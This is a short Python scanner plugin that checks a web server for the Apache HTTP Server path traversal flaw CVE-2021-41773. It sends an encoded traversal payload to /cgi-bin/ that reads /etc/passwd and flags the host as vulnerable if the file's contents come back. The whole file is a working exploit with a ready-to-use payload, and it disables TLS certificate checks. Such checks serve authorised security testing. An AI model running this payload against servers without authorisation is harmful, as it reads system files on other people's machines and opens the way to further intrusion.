import requests
import re
import urllib
import urllib.request
import ssl
from colorama import init

def verify(url):
    relsult = {
        'name': 'Apache HTTP Server Arbitrary File Read(CVE-2021-41773)',
        'vulnerable': False
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
    }

    payload = '/cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd'
    # 防止ssl报错
    context = ssl._create_unverified_context()
    vurl = urllib.parse.urljoin(url, payload)
    try:
        re = urllib.request.Request(url=vurl, headers=headers)
        response = urllib.request.urlopen(re, context=context, timeout=3)
        response = response.read().decode('utf-8')
        if "root:x:" in str(response):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['vulurl'] = vurl
            relsult['about'] = 'https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013'
            return relsult
        else:
            return relsult
    except:
        return relsult


